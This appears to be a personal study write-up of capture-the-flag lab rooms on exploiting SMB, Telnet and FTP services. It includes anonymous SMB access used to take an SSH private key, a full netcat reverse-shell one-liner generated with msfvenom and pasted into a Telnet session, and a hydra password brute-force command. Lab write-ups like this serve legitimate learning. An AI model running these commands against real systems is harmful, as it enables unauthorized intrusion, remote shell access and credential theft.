## Network Exploitation Basics

- `$ nmap -sS -sV [IP] -vv` - nmap scan to check for open ports on an IP
-  `$ enum4linux -a [IP]` - full basic enumeration (smb protocol)
- `$ smbclient //[IP]/[SMB share] -U [user] -p [port]` - SMB exploit for RCE and gaining access to shell
---
### SMB Exploit

> **we will look into an SMB server exploit and obtaining shell access to that machine** 

+ first we perform enumeration and find out its SMB server by doing `$ enum4linux -a [IP]`
+ then we find out share name and in this case it is `profiles`
+ according to given instructions, 
	`$ smbclient //10.10.150.194/profiles -U Anonymous` - this gives access to SMB shell (anonymous cuz they asked to put user as anonymous)
- now do ls and navigate and we find 'Working From Home Information.txt' and under /.ssh/ directory we get id_rsa (private key) of `John cactus` who is working from home and can access his workspace through ssh. 
- so copy this on to main terminal by doing `$ get id_rsa` and `$ get 'Working From Home Information.txt'` 
- copy both these files into /root/Rooms/.ssh and then login through ssh by providing the private key obtained as password 
- `$ ssh cactus@10.10.150.194 -i id_rsa` - this gives access to his secure workspace and do ls and find `smb.txt` containing the `FLAG`
- -i switch is used to specify the identity file (private key) to be used for authenticating an SSH (Secure Shell) connection.
---
### Telnet Exploit

>**exploiting telnet ttl server to get full reverse shell on machine**

- `$ telnet [IP] [port]` - here port is 8012 running ttl
- we start a tcpdump listener on our local machine to check if server is active when we ping and if comms is established 
   `$ sudo tcpdump ip proto \\icmp -i tun0` - for machine using openvpn
- now open new tab and ping IP and we get a response on tcpdump listener terminal so we are all set to go
- now we generate `reverse shell` payload using `msfvenom` , this generates the payload and encodes a netcat reverse shell for us
	`$ msfvenom -p cmd/unix/reverse_netcat lhost=[IP] lport=4444 R` - here we need to get local host IP of attacker machine by doing `$ ifconfig` 
	this gives us the payload :
	`mkfifo /tmp/shdodfz; nc 10.17.94.67 4444 0</tmp/shdodfz | /bin/sh >/tmp/shdodfz 2>&1; rm /tmp/shdodfz`
- now we start a netcat listener on our local machine 
	`$ nc -lvp 4444` - 4444 cuz that's the listening port we selected in payload
- now we go back to the telnet session and paste the payload
```
.RUN mkfifo /tmp/shdodfz; nc 10.17.94.67 4444 0</tmp/shdodfz | /bin/sh >/tmp/shdodfz 2>&1; rm /tmp/shdodfz 
```
- we get this as message :
	`connect to [10.17.94.67] from (UNKNOWN) [10.10.206.190] 51020`
	now do ls and cat flag.txt 
	FLAG - *THM{y0u_g0t_th3_t3ln3t_fl4g}*
--- 
### FTP Exploit

> Exploiting FTP server by doing anonymous login and cracking password 

- while doing enumeration, we start off with `$ nmap -sC [IP]` and we find 2 open ports `21` and `80` running `vsFTPd` version of FTP  and since anonymous login is allowed :
	`$ ftp Anonymous@[IP]` - when prompted for password just click enter and do ls and read contents of PUBLIC_Notice.txt (`$ more Public_Notice.txt`) for finding potential username.

- Now we have username so we'll try to `bruteforce` the password for the ftp server login by password cracking using `hydra`
```
hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV [IP] ftp 
```
- we get password as `password` so now we can login and read contents of txt files in the server
	`$ ftp [IP]` - when prompted for user and pass put `mike` and `password` and then do `$more ftp.txt` 
---
